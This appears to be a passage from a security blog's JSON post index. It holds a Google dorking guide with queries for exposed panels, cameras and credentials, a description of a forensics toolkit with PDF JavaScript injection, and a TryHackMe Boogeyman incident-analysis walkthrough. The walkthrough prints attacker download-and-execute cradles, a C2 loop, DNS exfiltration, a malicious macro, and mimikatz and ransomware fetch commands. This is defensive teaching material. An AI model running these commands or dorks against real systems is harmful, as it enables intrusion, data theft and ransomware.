Dorksinurl:/phpmyadmin/index.phpinurl:/db/websql/inurl:/phpPgAdmin/index.phpintext:\"phpPgAdmin — Login\"Search for Vulnerabilitiesintext:\"Error Message\" intext:\"MySQL server\" intext:\"on * using password:\"intext:\"Warning: mysql_connect()\" intext:\"on line\" filetype:phpExposed Documents and Filesfiletype:pdf intitle:\"Confidential\"filetype:doc intitle:\"Confidential\"filetype:xls intitle:\"Confidential\"filetype:ppt intitle:\"Confidential\"Directory Listingsintitle:\"Index of\" inurl:/parent-directoryintitle:\"Index of\" inurl:/admin*intitle:\"Index of\" inurl:/backupintitle:\"Index of\" inurl:/configintitle:\"Index of\" inurl:/logsExposed Webcams and Camerasinurl:\"view/index.shtml\"intitle:\"Live View /-AXIS\"intitle:\"Network Camera NetworkCamera\"Authentication-Related Dorksintitle:\"Login\" inurl:/adminintitle:\"Login\" inurl:/logininurl:\"/admin/login.php\"Exposed Control Panelsintitle:\"Control Panel\" inurl:/adminintitle:\"Control Panel\" inurl:/cpanelExposed IoT Devicesintitle:\"Smart TV\" inurl:/cgi-bin/loginintitle:\"Router Login\" inurl:/loginFinding PHP Info Pagesintitle:\"PHP Version\" intext:\"PHP Version\"Exposing Sensitive Files on Government Sitessite:gov (inurl:doc | inurl:pdf | inurl:xls | inurl:ppt | inurl:rtf | inurl:ps)Exposed Network Devicesintitle:\"Brother\" intext:\"View Configuration\"intitle:\"Network Print Server\" filetype:htmlintitle:\"HP LaserJet\" inurl:SSI/index.htmFile Upload Vulnerabilitiesinurl:/uploadfile/ filetype:phpintext:\"File Upload\" inurl:/php/Advanced TechniquesAdvanced Query CraftingCombine multiple operators for precise searches. Use parentheses () to group conditions and logical operators (OR, AND, -) to refine results.Example:site:example.com (intitle:\"login\" OR inurl:\"admin\") filetype:phpExploiting Specific Vulnerabilities  SQL Injection: inurl:index.php?id=  XSS Vulnerabilities: inurl:search.php?q=  File Inclusion Vulnerabilities: inurl:index.php?page=Using Google Dorking for OSINT  Gathering Information: site:linkedin.com intitle:\"John Doe\"  Finding Leaked Credentials: filetype:txt \"username\" \"password\"Automation and ScriptingAutomate Google Dorking using Python and the requests library.Example Script:import requestsdef google_dork(query):    url = f\"https://www.google.com/search?q={query}\"    headers = {\"User-Agent\": \"Mozilla/5.0\"}    response = requests.get(url, headers=headers)    return response.textquery = 'inurl:index.php?id='results = google_dork(query)print(results)Case StudiesReal-World Example 1: Finding Exposed Admin PanelsA penetration tester used the following query to find exposed admin panels:intitle:\"Admin Login\" inurl:/adminReal-World Example 2: Exploiting SQL InjectionA bug bounty hunter used the following query to find SQL injection vulnerabilities:inurl:index.php?id=Preventing Google DorkingTo protect your website from Google Dorking:  IP-based Restrictions: Limit access to sensitive areas.  Vulnerability Scans: Regularly scan for vulnerabilities.  Google Search Console: Remove sensitive content from search results.  robots.txt: Use this file to block search engines from indexing sensitive directories.  Secure Passwords: Change default passwords on devices and systems.  Disable Remote Logins: Prevent unauthorized access to network devices.Google Dorking Tools and ResourcesHere are some tools and resources to help you get started:  DorkSearch: https://dorksearch.com  Dorks Builder: https://dorks.faisalahmed.me  Google Hacking Database (GHDB): https://www.exploit-db.com/google-hacking-database  Google Operators Guide: https://support.google.com/vault/answer/2474474Legal ConsiderationsUnderstanding Legal BoundariesGoogle Dorking can be a legal gray area. Ensure you have explicit permission before testing any website. Unauthorized access to systems is illegal and punishable by law.ConclusionGoogle Dorking is an invaluable skill for cybersecurity professionals, but it must be used responsibly. By mastering advanced techniques, automating queries, and understanding legal boundaries, you can leverage Google Dorking to enhance security and uncover vulnerabilities. Always prioritize ethical use and obtain proper authorization before performing any tests."
  },
  
  {
    "title": "Digital Forensics Toolkit",
    "url": "/posts/python-digital-forensics-toolkit",
    "categories": "Python, Digital Forensics Toolkit",
    "tags": "Python, Digital Forensics Toolkit",
    "date": "2025-01-26 00:00:00 +0000",
    





    
    "snippet": "Python tool for extracting, analyzing, and visualizing metadata from files. It supports batch processing, suspicious pattern detection, file signature spoofing, and PDF JavaScript injection for for...",
    "content": "Python tool for extracting, analyzing, and visualizing metadata from files. It supports batch processing, suspicious pattern detection, file signature spoofing, and PDF JavaScript injection for forensic testing.Digital Forensics Toolkit Repository  Link: Digital Forensics Toolkit RepositoryFeatures  Metadata Extraction: Extract detailed metadata from images, documents, audio, video, and other file types.  Batch Processing: Process multiple files at once to save time.  Export Options: Save metadata in JSON, CSV, XML, HTML, or plain text formats.  File Preview: View binary previews, entropy analysis, and metadata visualization.  Suspicious Pattern Detection: Identify potential threats like hidden scripts, passwords, or email addresses.  File Signature Spoofing: Modify file headers for testing purposes.  PDF JavaScript Injection: Inject custom JavaScript into PDFs (educational use only).  Metadata Removal: Strip metadata from files while preserving their usability.  Comparison Tool: Compare metadata between two files to identify differences and similarities.  Customizable Themes: Switch between light and dark themes for better usability.How It Works  Upload Files: Use the intuitive GUI to upload one or more files for analysis.  Extract Metadata: The tool analyzes the files and extracts detailed metadata, including file type, size, creation date, checksums, and more.  Advanced Analysis: Perform tasks like entropy analysis, suspicious pattern detection, and file signature spoofing.  Export Results: Save the extracted metadata in your preferred format for further analysis.  Visualization: Use charts and graphs to visualize metadata distributions, timelines, and comparisons.Code StructureThe project is organized into modular components for clarity and maintainability:  AppConfig: Handles application configuration and user preferences.  MetadataExtractor: Extracts and processes metadata from files.  FileProcessor: Performs batch processing and file operations.  PDFInjector: Injects JavaScript into PDFs for testing purposes.  SignatureSpoof: Modifies file headers to test forensic tools.  UIComponents: Implements the graphical user interface using tkinter.This modular structure ensures that each component is reusable and easy to extend.InterfaceBelow are some screenshots of the tool’s interface:Future EnhancementsWe have several exciting features planned for future updates:  Cloud Integration: Allow users to upload and analyze files directly from cloud storage services.  AI-Based Threat Detection: Use machine learning to detect anomalies and potential threats in files.  Cross-Platform Support: Expand compatibility to include mobile platforms.  Enhanced Visualization: Add more advanced charts and interactive visualizations.  Real-Time Collaboration: Enable multiple users to collaborate on file analysis in real-time.Ethical ConsiderationsThe Digital-Forensics-Toolkit is designed for educational and forensic research purposes only. It is crucial to use this tool responsibly and ethically:  Respect Privacy: Do not use this tool to analyze files without proper authorization.  Legal Compliance: Ensure that your use of this tool complies with local laws and regulations.  Educational Use: Features like PDF JavaScript injection and file signature spoofing are intended for learning and testing purposes only. Misuse of these features can lead to legal consequences.By using this tool, you agree to adhere to ethical guidelines and take full responsibility for its usage.Additional TopicsSupported File TypesThe toolkit supports a wide range of file types, including:  Images: .jpg, .png, .gif, .bmp, .tiff  Documents: .pdf, .docx, .txt, .rtf  Audio: .mp3, .wav, .flac  Video: .mp4, .avi, .mkv  Archives: .zip, .rar, .7zPerformance OptimizationThe toolkit uses multithreading for batch processing, ensuring efficient handling of large datasets. It also includes progress indicators to keep users informed during long operations.Community ContributionsWe welcome contributions from the community! If you’d like to contribute, please fork the repository and submit a pull request. For major changes, please open an issue first to discuss your ideas."
  },
  
  {
    "title": "THM: Boogeyman (All)",
    "url": "/posts/ctf-blueteam-all-boogeyman",
    "categories": "CTF, Blue Team",
    "tags": "CTF, Blue Team",
    "date": "2025-01-22 00:00:00 +0000",
    





    
    "snippet": "WalkthroughCTF Platform: TryHackMeLevel: MediumTools Used:  Impacket: For SMB server setup and file transfer.  Wireshark/Tshark: For network traffic analysis.  jq: For parsing JSON logs.  PowerShel...",
    "content": "WalkthroughCTF Platform: TryHackMeLevel: MediumTools Used:  Impacket: For SMB server setup and file transfer.  Wireshark/Tshark: For network traffic analysis.  jq: For parsing JSON logs.  PowerShell: For decoding and analyzing malicious scripts.  KeePass/KPCLI: For decrypting KeePass databases.  Base64: For decoding file contents.  lnkparse: For analyzing Windows shortcut files.  SQLite3: For reading Sticky Notes databases.  Volatility: For memory forensics and process analysis.  Didier Stevens Suite (oledump.py): For analyzing malicious Office documents.  dnSpy: For decompiling .NET executables.  Elasticsearch: For querying logs.  PowerView.ps1: For enumerating domain resources.  Invoke-ShareFinder: For discovering shared resources and credentials.  Mimikatz: For credential dumping and Pass-the-Hash attacks.Resources Used:  Boogeyman 1: TryHackMe  Boogeyman 2: TryHackMe  Boogeyman 3: TryHackMe  PowerShell Event Logs  PCAP File Analysis  Malicious Attachment Analysis  Memory Dump Analysis  Elasticsearch LogsBoogeyman 1BackgroundJulianne, a finance employee working for Quick Logistics LLC, received a follow-up email regarding an unpaid invoice from their business partner, B Packaging Inc. Unbeknownst to her, the attached document was malicious and compromised her workstation.ExfiltrationSetting Up SMB ServerTo exfiltrate artifacts:$ impacket-smbserver &lt;NAME&gt; . -smb2supportZipping ArtifactsFrom the Ubuntu machine:ubuntu@tryhackme:~$ cd Desktopubuntu@tryhackme:~/Desktop$ zip -r artefacts.zip artefacts/*    [..omitted..]ubuntu@tryhackme:~/Desktop$ smbclient //&lt;IP&gt;/&lt;NAME&gt; -c 'put artefacts.zip' -NExtracting ArtifactsOn the host machine:$ unzip artefacts.zip$ ls artefacts  capture.pcapng  dump.eml  evtx2json  powershell.evtx  powershell.jsonPowerShell EventsAnalyzing PowerShell event logs:$ cat powershell.json | jq -r '.EventID' | sort | uniq -c | sort -bnr    939 4104     44 4100      2 53504      1 40962      1 40961Protocol HierarchyAnalyzing protocol usage:$ tshark -r capture.pcapng | sed -e 's/^[ ]*\\w*\\s*//g' | sed -E 's/\\s{2,}/ /g' | cut -d' ' -f5 | sort | uniq -c | sort -bnr  38769 TCP   3422 TLSv1.3   2060 QUIC   1989 HTTP   1229 DNS   1084 TLSv1.2     82 SSDP     77 TLSv1     74 ARP     14 UDP     12 NBNS     10 MDNS      7 HTTP/XML      5 SSLv2      5 IGMPv3      5 ICMPv6      5 ICMP      5 BROWSER      2 LLMNR      2 DHCPEmail AnalysisThe security team flagged the suspicious execution of the attachment, indicating a targeted attack on the finance team. The TTP used is attributed to the new threat group named Boogeyman, known for targeting the logistics sector.Exchange InformationThe email was sent by Arthur Griffin (agriffin@bpakcaging.xyz) to Julianne Westcott (julianne.westcott@hotmail.com):From: Arthur Griffin &lt;agriffin@bpakcaging.xyz&gt;Date: Fri, 13 Jan 2023 09:25:26 +0000Subject: Collection for Quick Logistics LLC - Jan 2023Message-Id: &lt;4uiwqc5wd1qx.HPk2p-JE_jYbkWIRB-SmuA2@tracking.bpakcaging.xyz&gt;Reply-To: Arthur Griffin &lt;agriffin@bpakcaging.xyz&gt;Sender: agriffin@bpakcaging.xyzTo: Julianne Westcott &lt;julianne.westcott@hotmail.com&gt;Security HeadersBoth SPF and DMARC passed, showing no email spoofing. DKIM checks detected two signatures:Authentication-Results: spf=pass (sender IP is 15.235.99.80) smtp.mailfrom=bpakcaging.xyz; dkim=pass (signature was verified) header.d=bpakcaging.xyz;dmarc=bestguesspass action=none header.from=bpakcaging.xyz;compauth=pass reason=109Received-SPF: Pass (protection.outlook.com: domain of bpakcaging.xyz designates 15.235.99.80 as permitted sender) receiver=protection.outlook.com; client-ip=15.235.99.80; helo=pa80.mxout.mta1.net; pr=CDKIM-Signature: v=1; a=rsa-sha256; d=bpakcaging.xyz; s=api; c=relaxed/simple;\tt=1673601926; h=from:date:subject:reply-to:to:list-unsubscribe:mime-version;\tbh=DORzQK4K9VXO5g47mYpyX7cPagIyvAX1RLfbY0szvCc=;\tb=dCB9MhhsZqg4h2P9dg5zMjLj7HVS9vt0fXuqEzH8cj6ft+YBJxvZHkF8uc+CeOas6CoICaPu13Q\toL/xVebg3aO8bmlooJWTAZx7mmrh/1ZQBVHm3wvGVI9Xn55nhWzRGoqVOAAPPM6+MEHFwZDIjKDAs\tRpDurrnykQeCXCp127k=DKIM-Signature: v=1; a=rsa-sha256; d=elasticemail.com; s=api;\tc=relaxed/simple; t=1673601926;\th=from:date:subject:reply-to:to:list-unsubscribe;\tbh=DORzQK4K9VXO5g47mYpyX7cPagIyvAX1RLfbY0szvCc=;\tb=jcC3z+U5lVQUJEYRyQ76Z+xaJMrXN2YdjyM8pUl7hgXesQaY7rqSORNRWynpDQ3/CBSllw31eDq\tWmoqpFqj2uVy5RXK73lkBEHs5ju1eH/4svHpZLS9+wU/tO5dfZVUImvY32iinpJCtoiMLjdpKYMA/\td5BBGqluALtqy9fZQzM=Email BodyThe email contained an encrypted attachment with the password Invoice2023!.Email AttachmentA ZIP file, Invoice.zip, was attached to the email. Extracting its contents:$ cat Invoice.zip_b64 | tr -d '' | base64 -d &gt; Invoice.zip$ file Invoice.zip            Invoice.zip: Zip archive data, at least v2.0 to extract, compression method=deflate$ unzip Invoice.zip    Archive:  Invoice.zip  [Invoice.zip] Invoice_20230103.lnk password: Invoice2023!  zsh: suspended  unzip Invoice.zipExamining Invoice_20230103.lnk:$ lnkparse Invoice_20230103.lnk   Windows Shortcut Information:     Link CLSID: 00021401-0000-0000-C000-000000000046     Link Flags: HasTargetIDList | HasName | HasRelativePath | HasWorkingDir | HasArguments | HasIconLocation | IsUnicode | HasExpIcon - (16637)     File Flags:  - (0)     Creation Timestamp: None     Modified Timestamp: None     Accessed Timestamp: None     Icon Index: 0      Window Style: SW_SHOWMINNOACTIVE      HotKey: CONTROL - C {0x4302}      TARGETS:        Index: 78        ITEMS:           Root Folder              Sort index: My Computer              Guid: 20D04FE0-3AEA-1069-A2D8-08002B30309D           Volume Item              Flags: 0xf              Data: None           File entry              Flags: Is directory              Modification time: None              File attribute flags: 16              Primary name: Windows           File entry              Flags: Is directory              Modification time: None              File attribute flags: 16              Primary name: System32           File entry              Flags: Is directory              Modification time: None              File attribute flags: 16              Primary name: WindowsPowerShell           File entry              Flags: Is directory              Modification time: None              File attribute flags: 16              Primary name: v1.0           File entry              Flags: Is file              Modification time: None              File attribute flags: 0              Primary name: powershell.exe     DATA        Description: Invoice Jan 2023        Relative path: ..\\..\\..\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe        Working directory: C:        Command line arguments: -nop -windowstyle hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==        Icon location: C:\\Users\\Administrator\\Desktop\\excel.ico     EXTRA BLOCKS:        ICON_LOCATION_BLOCK           Target ansi: %USERPROFILE%\\Desktop\\excel.ico           Target unicode: %USERPROFILE%\\Desktop\\excel.ico        SPECIAL_FOLDER_LOCATION_BLOCK           Special folder id: 37        KNOWN_FOLDER_LOCATION_BLOCK           Known folder id: 1AC14E77-02E7-4E5D-B744-2EB1AE5198B7        METADATA_PROPERTIES_BLOCK           Version: 0x53505331           Format id: 46588AE2-4CBC-4338-BBFC-139326986DCEThe encoded PowerShell command downloads and executes a payload:iex (new-object net.webclient).downloadstring('http://files.bpakcaging.xyz/update')Log AnalysisTimestamp FixSorting JSON logs by timestamp:$ cat powershell.json | jq -s -c 'sort_by(.Timestamp) | .[]' &gt; powershell1.jsonPowerShell LogsAnalyzing executions:$ cat powershell1.json | grep 4104 | jq '.ScriptBlockText' | grep -v Set-StrictModeInitial ExecutionDownloading update:iex (new-object net.webclient).downloadstring('http://files.bpakcaging.xyz/update')Establishing C2 Connection$s='cdn.bpakcaging.xyz:8080';$i='8cce49b0-b86459bb-27fe2489';$p='http://';$v=Invoke-WebRequest -UseBasicParsing -Uri $p$s/8cce49b0 -Headers @{\"X-38d2-8f49\"=$i};while ($true){$c=(Invoke-WebRequest -UseBasicParsing -Uri $p$s/b86459bb -Headers @{\"X-38d2-8f49\"=$i}).Content;if ($c -ne 'None') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-WebRequest -Uri $p$s/27fe2489 -Method POST -Headers @{\"X-38d2-8f49\"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}Seatbelt ExecutionLocating sensitive files:cd Users;pwdcd j.westcott;pwdps;pwdiex(new-object net.webclient).downloadstring('https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-Seatbelt.ps1');pwdcd Public;pwdcd Music;pwdiwr http://files.bpakcaging.xyz/sb.exe -outfile sb.exe;pwd.\\\\sb.exe all;pwd.\\\\sb.exe system;pwd.\\\\sb.exe;pwd.\\\\sb.exe -group=all;pwdSeatbelt.exe -group=user;pwd.\\\\sb.exe -group=user;pwdls C:\\\\Users\\\\j.westcott\\\\Documents\\\\protected_data.kdbx;pwdKeePass Database ExfiltrationExfiltrating via DNS:$file='protected_data.kdbx'; $destination = \"167.71.211.113\"; $bytes = [System.IO.File]::ReadAllBytes($file);split-path $pwd'\\\\0x00';$file='C:\\\\Users\\\\j.westcott\\\\Documents\\\\protected_data.kdbx'; $destination = \"167.71.211.113\"; $bytes = [System.IO.File]::ReadAllBytes($file);$hex = ($bytes|ForEach-Object ToString X2) -join '';$split = $hex -split '(\\\\S{50})'; ForEach ($line in $split) {     nslookup -q=A \"$line.bpakcaging.xyz\" $destination;} echo \"Done\";Network AnalysisHTTP TrafficIdentifying servers:$ tshark -r capture.pcapng -Y 'http.response_for.uri contains \"bpakcaging.xyz\" and http' -T json | jq -r '.[].\"_source\".layers.http | with_entries(if (.key|test(\"http.(server)\")) then ({key: \"server\", value: .value}) else empty end) | .server' | sort | uniq -c | sort -nr    929 Apache/2.4.1       3 SimpleHTTP/0.6 Python/3.10.7Command ExecutionsDecoding POST data:$ tshark -r capture.pcapng -Y 'http.request.full_uri contains \"/27fe2489\" and http' -T json| jq -r '.[].\"_source\".layers.http | with_entries(if (.key|test(\"http.file_data\")) then ({key: \"data\", value: .value}) else empty end) | .data' | head -n1  13 13 10 13 10 80 97 116 104 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 13 10 45 45 45 45 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 13 10 67 58 92 87 105 110 100 111 119 115 92 115 121 115 116 101 109 51 50 13 10 13 10 13 10Converting to ASCII:$ for i in $(cat c2.data); do for x in $i; do hex=$(printf '%x' $x); echo -ne \"\\x$hex\"; done; doneDNS ExfiltrationReconstructing the KeePass database:$ tshark -r capture.pcapng -Y \"ip.dst==167.71.211.113 and dns\" -T fields -e dns.qry.name | grep -E '[A-F0-9]+.bpakcaging.xyz$' | cut -d'.' -f1 | tr -d '' | xxd -p -r &gt; protected_data.kdbx$ file protected_data.kdbx   protected_data.kdbx: Keepass password database 2.x KDBXOpening the KeePass database:$ kpcli --kdb=protected_data.kdbx Provide the master password: *************************kpcli:/&gt; dir  === Groups ===  protected_data/kpcli:/&gt; cd protected_datakpcli:/protected_data&gt; dir  === Groups ===  eMail/  General/  Homebanking/  Internet/  Network/  Recycle Bin/  Windows/kpcli:/protected_data&gt; cd Homebankingkpcli:/protected_data/Homebanking&gt; dir  === Entries ===  0. Company Card                                                           kpcli:/protected_data/Homebanking&gt; show 0  Title: Company Card  Uname:    Pass:     URL:   Notes:   String Values:            1) Account Number = 4024007128269551           2) CVV = 970           3) Expiration Date = 3/2028           4) Name = Quick Logistics LLCBoogeyman 2BackgroundMaxine, a Human Resource Specialist working for Quick Logistics LLC, received an application from one of the open positions in the company. Unbeknownst to her, the attached resume was malicious and compromised her workstation.ExfiltrationSetting Up Python HTTP ServerTo exfiltrate artifacts:$ cd Desktop/Artefacts/$ python3 -m http.serverDownloading ArtifactsFrom the host machine:$ wget http://&lt;THM_IP&gt;:8000/&lt;filename&gt;Email AnalysisEmail HeaderThe email was sent by Wesley Taylor (westaylor23@outlook.com) to Maxine Beck (maxine.beck@quicklogisticsorg.onmicrosoft.com):From: \"westaylor23@outlook.com\" &lt;westaylor23@outlook.com&gt;To: \"maxine.beck@quicklogisticsorg.onmicrosoft.com\"Content-Type: application/msword; name=\"Resume_WesleyTaylor.doc\"Email AttachmentA .doc file was attached to the email. Extracting its contents:$ cat Resume\\ -\\ Application\\ for\\ Junior\\ IT\\ Analyst\\ Role.eml | grep -i -E '^[A-Z0-9+/=]{32,76}' | tr -d '\\r' | base64 -d &gt; Resume_WesleyTaylor.doc$ file Resume_WesleyTaylor.doc  Resume_WesleyTaylor.doc: Composite Document File V2 Document, Little Endian, Os: Windows, Version 10.0, Code page: 1252Analyzing the Malicious MacroUsing oledump.py to analyze macros:$ python3 ./git/DidierStevensSuite/oledump.py ./CTF/THM/Boogeyman2/Resume_WesleyTaylor.doc    1:       114 '\\x01CompObj'    2:      4096 '\\x05DocumentSummaryInformation'    3:      4096 '\\x05SummaryInformation'    4:      7288 '1Table'    5:     28574 'Data'    6:       414 'Macros/PROJECT'    7:        71 'Macros/PROJECTwm'    8: M    2027 'Macros/VBA/NewMacros'    9: m     962 'Macros/VBA/ThisDocument'   10:      2787 'Macros/VBA/_VBA_PROJECT'   11:      2242 'Macros/VBA/__SRP_0'   12:       122 'Macros/VBA/__SRP_1'   13:       935 'Macros/VBA/__SRP_2'   14:       156 'Macros/VBA/__SRP_3'   15:       570 'Macros/VBA/dir'   16:      4096 'WordDocument'The macro downloads a file (update.png) and saves it as update.js, then executes it via wscript.exe:Attribute VB_Name = \"NewMacros\"Sub AutoOpen()spath = \"C:\\ProgramData\\\"Dim xHttp: Set xHttp = CreateObject(\"Microsoft.XMLHTTP\")Dim bStrm: Set bStrm = CreateObject(\"Adodb.Stream\")xHttp.Open \"GET\", \"https://files.boogeymanisback.lol/aa2a9c53cbb80416d3b47d85538d9971/update.png\", FalsexHttp.SendWith bStrm    .Type = 1    .Open    .write xHttp.responseBody    .savetofile spath &amp; \"\\update.js\", 2End WithSet shell_object = CreateObject(\"WScript.Shell\")shell_object.Exec (\"wscript.exe C:\\ProgramData\\update.js\")End SubMemory AnalysisIdentifying ProcessesUsing Volatility to identify suspicious processes:$ python2 vol.py -f $THM/Boogeyman2/WKSTN-2961.raw --profile=Win10x64_18362 pstree | grep -C2 -i wscript  .... 0xffffe58f81150080:WINWORD.EXE                  1124   1440     18      0 2023-08-21 14:12:31 UTC+0000  ..... 0xffffe58f864ca0c0:wscript.exe                 4260   1124      6      0 2023-08-21 14:12:47 UTC+0000  ...... 0xffffe58f87ac0080:updater.exe                6216   4260     18      0 2023-08-21 14:12:48 UTC+0000Extracting updater.exeDumping updater.exe from memory:$ python2 vol.py -f $THM/Boogeyman2/WKSTN-2961.raw --profile=Win10x64_18362 procdump -D $THM/Boogeyman2/volatility -p 6216$ file executable.6216.exe  executable.6216.exe: PE32+ executable (GUI) Intel 80386 Mono/.Net assembly, for MS WindowsDecompiling with dnSpy reveals that updater.exe is an Empire stager compiled via Sharpire and calls back to 128.199.95.189:8080.Persistence MechanismScheduled Task CreationExtracting process memory of updater.exe:$ python2 vol.py -f $THM/Boogeyman2/WKSTN-2961.raw --profile=Win10x64_18362 memdump -p 6216 -D $THM/Boogeyman2/volatilityStrings reveal a scheduled task named Updater:$ strings -el 6216.dmp | grep -i \"powershell.exe \"  \"C:\\Windows\\system32\\schtasks.exe\" /Create /F /SC DAILY /ST 09:00 /TN Updater /TR \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NonI -W hidden -c \\\"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion debug).debug)))\\\"\"Extracting Task ConfigurationExtracting the XML configuration of the scheduled task:$ python3 vol.py -f $THM/Boogeyman2/WKSTN-2961.raw filescan | grep -i 'System32\\\\Tasks\\\\'$ python3 vol.py -f $THM/Boogeyman2/WKSTN-2961.raw windows.dumpfiles --virtaddr 0xe58f89295990XML confirms the task runs a PowerShell command:&lt;Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\"&gt;    &lt;Actions Context=\"Author\"&gt;        &lt;Exec&gt;            &lt;Command&gt;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe&lt;/Command&gt;            &lt;Arguments&gt;-NonI -W hidden -c \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion debug).debug)))\"&lt;/Arguments&gt;        &lt;/Exec&gt;    &lt;/Actions&gt;&lt;/Task&gt;Decoding Base64 PayloadExtracting the encoded payload from the registry:$ strings -el registry.0xffff9582f2681000.ntuserdat.reg | grep -i -E '[a-z0-9\\+\\/=]{100,}' | base64 -dThe decoded payload is another Empire stager calling back to 128.199.95.189:8080.Network AnalysisC2 CommunicationAnalyzing connections using Volatility:$ python2 vol.py -f $THM/Boogeyman2/WKSTN-2961.raw --profile=Win10x64_18362 netscan | grep -C2 updater.exe  0xe58f86b73010     TCPv4    10.10.49.181:63308             128.199.95.189:8080  CLOSED           -1                      3884-06-06 01:06:33 UTC+0000Boogeyman 3BackgroundWithout tripping any security defenses of Quick Logistics LLC, the Boogeyman compromised an employee’s email access and waited in the shadows for the right moment to escalate the attack. Using this initial foothold, the threat actors targeted the CEO, Evan Hutchinson, expanding their impact on the organization.Incident Timeline            Timestamp      Event                  2023-08-30 01:31:39      Pass-the-Hash using the Domain Administrator on WKSTN-1327.              2023-08-30 01:45:41      Execution of Empire stager on DC01 from WKSTN-0051.              2023-08-30 01:46:18      Download of mimikatz.exe on DC01.              2023-08-30 01:47:57      DCSync attack on the Domain Administrator user (backupda).              2023-08-30 01:53:13      Download of ransomboogey.exe on DC01.              2023-08-30 01:53:33      Execution of ransomboogey.exe on DC01 by Administrator.              2023-08-30 01:56:40      Last download of ransomboogey.exe on WKSTN-1327.              2023-08-30 01:59:36      First download of ransomboogey.exe on WKSTN-0051.              2023-08-30 02:06:09      Empire stager execution as Domain Admin on WKSTN-0051.              2023-08-30 02:06:25      Empire stager execution as Domain Admin on WKSTN-1327.              2023-08-30 02:07:22      Execution of ransomboogey.exe on WKSTN-1327 by itadmin.      ArtifactsExfiltrationUsing Elasticsearch to analyze logs:$ curl -d \"$(cat query.json)\" -H 'Content-Type: application/json' -s http://elastic:elastic@&lt;ELASTIC_IP&gt;:9200/winlogbeat-7.17.6-2023.08.29-000001/_search?size=3000 | jq -c '.hits.hits[].\"_source\"' | grep command_line | jq -r '\"\\(.\"@timestamp\") \\(.user.name)\\t\\(.process.pid)\\t\\(.process.parent.pid)\\t\\(.process.command_line)\"' | sortRansomware ExecutionThe ransomware ransomboogey.exe was downloaded and executed across multiple endpoints:$ curl -d \"$(cat query.json)\" -H 'Content-Type: application/json' -s http://elastic:elastic@&lt;ELASTIC_IP&gt;:9200/winlogbeat-7.17.6-2023.08.29-000001/_search?size=3000 | jq -c '.hits.hits[].\"_source\"' | grep command_line | jq -r '\"\\(.\"@timestamp\") \\(.user.name)@\\(.host.hostname)\\t\\(.process.pid)\\t\\(.process.parent.pid)\\t\\(.process.command_line)\"' | sort | grep ransomboogey.exeAttack VectorsInitial CompromiseThe attacker used an HTA file (ProjectFinancialSummary_Q3.pdf.hta) to execute malicious code:2023-08-29T23:51:15.856Z evan.hutchinson\t6392\t2940\t\"C:\\Windows\\SysWOW64\\mshta.exe\" \"D:\\ProjectFinancialSummary_Q3.pdf.hta\"This spawned three processes:2023-08-29T23:51:16.738Z evan.hutchinson\t3832\t6392\t\"C:\\Windows\\System32\\xcopy.exe\" /s /i /e /h D:\\review.dat C:\\Users\\EVAN~1.HUT\\AppData\\Local\\Temp\\review.dat2023-08-29T23:51:16.771Z evan.hutchinson\t3680\t6392\t\"C:\\Windows\\System32\\rundll32.exe\" D:\\review.dat,DllRegisterServerEmpire StagerThe Empire stager was executed on multiple endpoints and communicated with cdn.bananapeelparty.net:80 or 165.232.170.151:80:$ cat query_net.json{  \"query\": {    \"bool\": {      \"must\": { \"term\": { \"process.pid\": \"6160\" } },      \"should\": [{ \"match\": { \"event.category\": \"network\" } }],      \"filter\": { \"range\": { \"@timestamp\": { \"gte\": \"2023-08-29T00:00:00\", \"lte\": \"2023-08-31T00:00:00\" } } }    }  },  \"_source\": [\"@timestamp\", \"host.hostname\", \"source.ip\", \"source.port\", \"destination.ip\", \"destination.port\"]}Credential HarvestingMimikatz ExecutionThe attacker downloaded and executed mimikatz.exe to dump credentials:2023-08-30T01:46:18 evan.hutchinson\t&lt;mimikatz_pid&gt;\t&lt;parent_pid&gt;\t\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -c \"iwr http://ff.sillytechninja.io/mimikatz.exe -outfile mimikatz.exe; .\\mimikatz.exe\"Pass-the-HashUsing the dumped credentials, the attacker performed a Pass-the-Hash attack:2023-08-30T01:31:39 Pass-the-Hash using the Domain Administrator on WKSTN-1327.Lateral MovementInvoke-CommandThe attacker used Invoke-Command to execute commands remotely on other endpoints:Invoke-Command -ComputerName WKSTN-1327.quicklogistics.org -ScriptBlock { iwr http://ff.sillytechninja.io/ransomboogey.exe -outfile ransomboogey.exe; .\\ransomboogey.exe }Shared Resource DiscoveryUsing Invoke-ShareFinder, the attacker discovered credentials for allan.smith in a file named IT_Automation.ps1:2023-08-30T01:56:05.018Z Administrator@DC01\t4296\t4008\t\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -c \"Invoke-Command -ComputerName WKSTN-1327.quicklogistics.org -ScriptBlock { ... }\"Ransomware DeploymentDownload and ExecutionThe ransomware ransomboogey.exe was downloaded and executed on multiple endpoints:2023-08-30T01:53:13.738Z Administrator@DC01\t4308\t4008\t\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -c \"iwr http://ff.sillytechninja.io/ransomboogey.exe -outfile ransomboogey.exe\"2023-08-30T01:53:33.815Z Administrator@DC01\t5572\t4008\t\"C:\\Users\\Administrator\\ransomboogey.exe\"Log AnalysisQuerying 